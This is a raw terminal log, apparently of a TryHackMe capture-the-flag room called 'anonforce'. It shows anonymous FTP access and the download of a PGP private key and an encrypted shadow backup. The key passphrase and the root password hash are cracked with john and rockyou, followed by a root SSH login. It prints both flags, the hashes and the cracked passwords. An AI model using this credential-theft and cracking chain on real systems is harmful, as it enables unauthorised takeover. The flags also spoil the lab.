# IP Address: 10.10.14.251

# Start off by ping the IP Address to see if we can get a response back.

ping 10.10.14.251     
PING 10.10.14.251 (10.10.14.251) 56(84) bytes of data.
64 bytes from 10.10.14.251: icmp_seq=1 ttl=61 time=95.6 ms
64 bytes from 10.10.14.251: icmp_seq=2 ttl=61 time=96.5 ms
64 bytes from 10.10.14.251: icmp_seq=3 ttl=61 time=124 ms
64 bytes from 10.10.14.251: icmp_seq=4 ttl=61 time=124 ms
64 bytes from 10.10.14.251: icmp_seq=5 ttl=61 time=102 ms
64 bytes from 10.10.14.251: icmp_seq=6 ttl=61 time=147 ms
^C
--- 10.10.14.251 ping statistics ---
6 packets transmitted, 6 received, 0% packet loss, time 5013ms
rtt min/avg/max/mdev = 95.615/114.731/146.721/18.483 ms

# nmap the IP Address to see what PORTS are opened.

nmap -sC -sV -oN nmap/initial 10.10.14.251

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                              
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ ftp 10.10.14.251
Connected to 10.10.14.251.
220 (vsFTPd 3.0.3)
Name (10.10.14.251:digi): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53771|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Apr 26 18:28 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   90 0        0               0 Apr 26 18:28 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Apr 26 18:29 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Apr 26 18:28 sys
drwxrwxrwt    9 0        0            4096 Apr 26 18:28 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> cd /home
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||14046|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||52864|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> cat user.txt
?Invalid command.
ftp> echo user.txt
?Invalid command.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||21822|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |****************************|    33      350.28 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.32 KiB/s)
ftp> cd /
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||54681|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Apr 26 18:28 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   84 0        0               0 Apr 26 18:28 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Apr 26 18:29 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Apr 26 18:28 sys
drwxrwxrwt    9 0        0            4096 Apr 26 18:28 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||15683|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||31912|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |*****************************|   524        4.50 MiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (5.22 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||35581|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |*****************************|  3762       18.30 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (38.04 KiB/s)
ftp> 

# New terminal 

┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ ls         
nmap  user.txt
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ cat user.txt
606083fd33beb1284fc51f411a706af8
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ ls
backup.pgp  nmap  private.asc  user.txt
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ gpg2john private.asc > hash

File private.asc
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ ls
backup.pgp  hash  nmap  private.asc  user.txt
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)     
1g 0:00:00:00 DONE (2025-04-26 21:42) 50.00g/s 51200p/s 51200c/s 51200C/s hawaii..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ gpg --import private.asc   
gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ ls                      
backup.pgp  hash  nmap  private.asc  user.txt
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ gpg --decrypt backup.pgp
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ nano hash.txt
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ cat hash.txt
$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ ls                                                       
backup.pgp  hash  hash.txt  nmap  private.asc  user.txt
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ rm hash           
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ rm hash.txt
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ nano hash    
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt    
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ nano hash
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ rm hash    
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ nano hash
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ cat hash    
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)     
1g 0:00:00:01 DONE (2025-04-26 21:52) 0.5847g/s 4191p/s 4191c/s 4191C/s 98765432..emoemo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ ssh root@10.10.14.251            
The authenticity of host '10.10.14.251 (10.10.14.251)' can't be established.
ED25519 key fingerprint is SHA256:+bhLW3R5qYI2SvPQsCWR9ewCoewWWvFfTVFQUAGr+ew.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? 
Host key verification failed.
                                                                          
┌──(digi㉿kali)-[~/ctf/thm/anonforce]
└─$ ssh root@10.10.14.251
The authenticity of host '10.10.14.251 (10.10.14.251)' can't be established.
ED25519 key fingerprint is SHA256:+bhLW3R5qYI2SvPQsCWR9ewCoewWWvFfTVFQUAGr+ew.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.14.251' (ED25519) to the list of known hosts.
root@10.10.14.251's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
f706456440c7af4187810c31c6cebdce
root@ubuntu:~# 
